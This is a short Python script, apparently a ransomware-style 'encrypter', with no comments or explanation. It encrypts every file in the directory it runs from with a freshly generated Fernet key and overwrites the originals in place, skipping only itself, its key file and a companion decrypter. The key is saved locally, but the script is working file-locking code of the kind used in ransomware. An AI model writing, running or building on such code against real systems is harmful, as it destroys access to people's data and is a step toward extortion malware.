import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypter.py" or file == "keyfile.key" or file == "decrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("keyfile.key", "wb") as skey:
    skey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypted)

